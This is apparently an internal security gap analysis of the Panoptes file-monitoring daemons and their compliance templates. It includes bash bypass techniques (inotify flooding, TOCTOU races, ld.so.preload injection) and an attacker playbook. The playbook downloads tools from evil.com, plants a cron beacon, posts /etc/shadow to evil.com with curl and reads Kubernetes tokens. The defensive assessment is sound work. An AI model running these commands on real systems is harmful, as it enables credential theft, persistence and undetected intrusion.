# Attack Surface Analysis: Panoptes Compliance Templates

> **Classification:** Internal Security Analysis
> **Date:** 2026-01-21
> **Scope:** All compliance templates in `deploy/compliance/`

This document analyzes the Panoptes monitoring system from an adversarial perspective, identifying attack vectors that are detected, techniques that can bypass monitoring, and gaps in coverage.

---

## Executive Summary

**Key Findings:**

| Category | Status |
|----------|--------|
| Persistence detection | Good - cron, systemd, SSH monitored |
| Credential protection | Good - shadow, SSH keys protected |
| Container escape prevention | **CIS-K8s only** - others audit-only |
| Staging area monitoring | **GAP** - /tmp, /dev/shm unmonitored |
| Library injection detection | **GAP** - only NIST monitors /usr/lib |
| Enforcement mode | **GAP** - 6/7 templates audit-only |

**Risk Level:** MEDIUM-HIGH for production deployments using non-CIS templates without enforcement.

---

## Part 1: Attack Vectors Successfully Detected

### 1.1 Persistence Mechanisms (MITRE ATT&CK T1053, T1037, T1546)

| Attack | Detection Method | Templates | Confidence |
|--------|------------------|-----------|------------|
| Cron job creation | ArgusWatcher: create on `/etc/cron.d/*` | All | HIGH |
| Systemd service install | ArgusWatcher: create/modify on `/etc/systemd/system` | All | HIGH |
| Init script backdoor | ArgusWatcher: modify on `/etc/init.d/*` | All | HIGH |
| SSH authorized_keys | ArgusWatcher: all events on `/root/.ssh` | All | HIGH |
| Shell profile modification | ArgusWatcher: modify on `/etc/profile` | Base, NIST | MEDIUM |

### 1.2 Credential Access (MITRE ATT&CK T1003, T1552)

| Attack | Detection Method | Templates | Confidence |
|--------|------------------|-----------|------------|
| Shadow file read | JanusGuard: deny + audit `/etc/shadow` | All | HIGH |
| SSH private key theft | JanusGuard: deny `/root/.ssh/id_*` | All | HIGH |
| K8s secret access | JanusGuard: audit `/var/run/secrets/kubernetes.io` | All | MEDIUM* |
| Sudoers modification | ArgusWatcher: modify `/etc/sudoers*` | All | HIGH |

*K8s secrets use `autoAllowOwner: true` - see Section 2.2

### 1.3 Defense Evasion (MITRE ATT&CK T1070)

| Attack | Detection Method | Templates | Confidence |
|--------|------------------|-----------|------------|
| Log deletion | ArgusWatcher: delete on `/var/log/*` | All | HIGH |
| Log modification | ArgusWatcher: modify on `/var/log/*` | All | HIGH |
| Binary replacement | ArgusWatcher: modify `/usr/bin/*` | PCI-DSS, NIST, SOC2 | HIGH |
| Library injection | ArgusWatcher: create `/usr/lib/*` | **NIST only** | LOW |

### 1.4 Container Escape (CIS Kubernetes Only)

| Attack | Detection Method | Enforcement | Confidence |
|--------|------------------|-------------|------------|
| Docker socket access | JanusGuard: DENY `/var/run/docker.sock` | **BLOCKING** | HIGH |
| Containerd socket | JanusGuard: DENY `/var/run/containerd/containerd.sock` | **BLOCKING** | HIGH |
| Kubelet tampering | ArgusWatcher: modify `/var/lib/kubelet/*` | Audit | HIGH |

---

## Part 2: Kernel-Level Bypass Techniques

### 2.1 inotify Queue Overflow Attack

**Severity:** HIGH
**Difficulty:** LOW
**Code Reference:** `daemons/argusd/src/notify.rs:128-134`

**Technique:**
```bash
# Generate 20,000+ events to overflow queue (default max: 16,384)
for i in $(seq 1 20000); do
  touch /tmp/flood_$i && rm /tmp/flood_$i
done &

# During overflow window, modify monitored file
echo "backdoor" >> /etc/cron.d/malicious
```

**Why It Works:**
- Default `max_queued_events` = 16,384
- Kernel generates `IN_Q_OVERFLOW` when queue full
- Events during overflow are **permanently lost**
- Daemon may not immediately re-scan directories

**Detection Indicator:** `IN_Q_OVERFLOW` event in daemon logs

---

### 2.2 Move Event Timing Attack (TOCTOU)

**Severity:** MEDIUM
**Difficulty:** MEDIUM
**Code Reference:** `daemons/argusd/src/notify.rs:40-58`

**Technique:**
```bash
# Under high system load, exploit 2ms pairing timeout
mv /etc/cron.d/legitimate /tmp/legitimate &
sleep 0.001
mv /tmp/malicious /etc/cron.d/malicious &
```

**Why It Works:**
- Kernel generates separate `IN_MOVED_FROM` and `IN_MOVED_TO` events
- Events share cookie for pairing but arrive asynchronously
- Daemon uses 2ms timeout for pairing
- Under load, pairing fails - reported as unpaired delete

---

### 2.3 fanotify Process Attribution TOCTOU

**Severity:** MEDIUM
**Difficulty:** LOW
**Code Reference:** `daemons/janusd/src/main.rs:245-248`

**Technique:**
```bash
# Short-lived process exits before /proc read completes
(cat /etc/shadow > /tmp/stolen; exit) &
```

**Why It Works:**
- fanotify provides PID in event
- Daemon reads `/proc/{pid}/cmdline` after event arrives
- If process exits, PID may be reused by different process
- Audit log shows wrong process or "unknown"

---

### 2.4 Container PID Race

**Severity:** MEDIUM
**Difficulty:** HIGH
**Code Reference:** `daemons/common/src/container_runtime.rs:132-145`

**Technique:**
```bash
# In container:
# 1. Daemon resolves container via /proc/{pid}/root
# 2. Rapidly stop container
# 3. PID reused by host process
# 4. Monitoring targets wrong namespace
```

**Why It Works:**
- Daemon uses `/proc/{pid}/root` symlink for container access
- Symlink becomes invalid when container exits
- PID reuse can cause monitoring of wrong filesystem

---

### 2.5 Permission Response DoS

**Severity:** HIGH (when enforcement enabled)
**Difficulty:** LOW
**Code Reference:** `daemons/janusd/src/guard.rs:273-302`

**Technique:**
```bash
# Flood monitored path with access attempts
for i in $(seq 1 1000); do
  cat /etc/shadow &
done
# All processes hang waiting for FAN_ALLOW/FAN_DENY
```

**Why It Works:**
- In enforcement mode, kernel blocks process until response
- Heavy load delays daemon response
- Creates DoS on monitored paths

---

### 2.6 Watch Limit Exhaustion

**Severity:** MEDIUM
**Difficulty:** LOW
**Code Reference:** `daemons/argusd/src/notify.rs:54-58`

**Technique:**
```bash
# Exhaust inotify watch limit (default: 8192)
for i in $(seq 1 10000); do
  mkdir -p /var/tmp/exhaust_$i
done
# New watches silently fail after limit
```

**Why It Works:**
- Kernel limits watches per user
- `inotify_add_watch()` returns `ENOSPC` at limit
- If daemon doesn't handle gracefully, monitoring degrades

---

## Part 3: Container/K8s Evasion Techniques

### 3.1 Unmonitored Staging Areas

**Severity:** HIGH
**Affected:** ALL TEMPLATES

```bash
# Stage malware in unmonitored locations
curl https://evil.com/malware -o /dev/shm/payload
chmod +x /dev/shm/payload
/dev/shm/payload
rm /dev/shm/payload
# Zero events - completely invisible
```

**Unmonitored Paths:**
- `/tmp` - Temporary files
- `/var/tmp` - Persistent temp files
- `/dev/shm` - Shared memory (RAM-backed)

---

### 3.2 autoAllowOwner Abuse

**Severity:** MEDIUM
**Affected:** All templates except CIS-K8s

```yaml
# Current template configuration:
- deny:
    - /var/run/secrets/kubernetes.io
  autoAllowOwner: true  # <-- PERMISSIVE
```

```bash
# Pod can read any mounted secret:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Succeeds because autoAllowOwner allows owning process
```

**Impact:** Compromised pod reads all mounted secrets regardless of RBAC intent.

---

### 3.3 Log Rotation Evasion

**Severity:** MEDIUM
**Affected:** ALL TEMPLATES

```bash
# Exploit ignore patterns: *.gz, *.old, *.[0-9]
gzip /var/log/auth.log  # Creates auth.log.gz (ignored)
mv /var/log/syslog /var/log/syslog.1  # Renamed (ignored)
```

**Current Ignore Patterns:**
- `*.gz` - Compressed files
- `*.old` - Old backups
- `*.[0-9]` - Numbered rotations

---

### 3.4 Library Preload Injection

**Severity:** HIGH
**Affected:** All except NIST

```bash
# Only NIST monitors /usr/lib, /lib, /lib64
echo "/tmp/evil.so" >> /etc/ld.so.preload
cp evil.so /usr/lib/x86_64-linux-gnu/evil.so
# Non-NIST deployments: No detection
```

---

### 3.5 Unsupported Container Runtime

**Severity:** MEDIUM
**Code Reference:** `daemons/janusd/src/main.rs:193-196`

```bash
# Use runtime not detected by daemon:
# - Kata containers (different socket path)
# - gVisor (custom configuration)
# - Custom OCI runtime
# Daemon logs: "No container runtime detected"
```

---

## Part 4: Critical Gaps Summary

### 4.1 Unmonitored Paths

| Path | Attack Vector | Severity | Templates Affected |
|------|---------------|----------|-------------------|
| `/tmp` | Malware staging | HIGH | ALL |
| `/var/tmp` | Persistent staging | HIGH | ALL |
| `/dev/shm` | In-memory execution | HIGH | ALL |
| `/proc/*` | Environment injection | HIGH | ALL |
| `/sys/*` | Kernel params | HIGH | ALL |
| `/home/*/.bashrc` | User shell backdoor | MEDIUM | ALL |
| `/usr/lib/*` | Library injection | HIGH | All except NIST |

### 4.2 Enforcement Status

| Template | enforcing | Result |
|----------|-----------|--------|
| Base-Security | `false` | Logged only |
| PCI-DSS | `false` | Logged only |
| HIPAA | `false` | Logged only |
| SOC2 | `false` | Logged only |
| NIST 800-53 | `false` | Logged only |
| GDPR | `false` | Logged only |
| CIS-K8s | `true` | **Actually blocks** |

### 4.3 Audit-Only Network Tools

Tools that are logged but NOT blocked:

| Tool | Risk | Templates |
|------|------|-----------|
| curl | Data exfiltration | Base, SOC2, NIST, GDPR |
| wget | Download malware | Base, SOC2, NIST, GDPR |
| nc/ncat/netcat | Reverse shell | Base, SOC2, NIST |
| nmap | Reconnaissance | Base, SOC2, NIST |
| scp/rsync | Data transfer | GDPR |

---

## Part 5: Attacker Playbook

### Scenario: Full Data Exfiltration

```bash
# 1. Stage in unmonitored location
mkdir -p /dev/shm/stage
curl https://evil.com/tools.tar.gz -o /dev/shm/stage/tools.tar.gz
tar xzf /dev/shm/stage/tools.tar.gz -C /dev/shm/stage/
# Result: No detection

# 2. Overflow inotify queue
for i in $(seq 1 20000); do touch /tmp/f$i; rm /tmp/f$i; done &
# Result: Queue overflow

# 3. During overflow, install persistence
echo "* * * * * /dev/shm/stage/beacon" > /etc/cron.d/update
# Result: Event lost in overflow

# 4. Exfiltrate using curl (audit-only)
curl https://evil.com/collect -d @/etc/shadow
# Result: Logged but allowed

# 5. Clean up
rm -rf /dev/shm/stage
gzip /var/log/auth.log
# Result: Cleanup in ignored paths
```

### Scenario: Container Escape (non-CIS)

```bash
# 1. Read K8s secrets (autoAllowOwner allows)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# Result: Allowed

# 2. Access container runtime socket (audit-only)
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# Result: Logged but allowed (unless CIS-K8s enforcing)

# 3. Escape to host
# [container escape technique]
```

---

## Appendix: Code References

| Component | File | Lines |
|-----------|------|-------|
| inotify queue handling | `daemons/argusd/src/notify.rs` | 128-134 |
| Move event pairing | `daemons/argusd/src/notify.rs` | 40-58 |
| Watch limits | `daemons/argusd/src/notify.rs` | 54-58 |
| fanotify process info | `daemons/janusd/src/main.rs` | 245-248 |
| Permission response | `daemons/janusd/src/guard.rs` | 273-302 |
| Container PID resolution | `daemons/common/src/container_runtime.rs` | 132-145 |
| Runtime detection | `daemons/janusd/src/main.rs` | 193-196 |
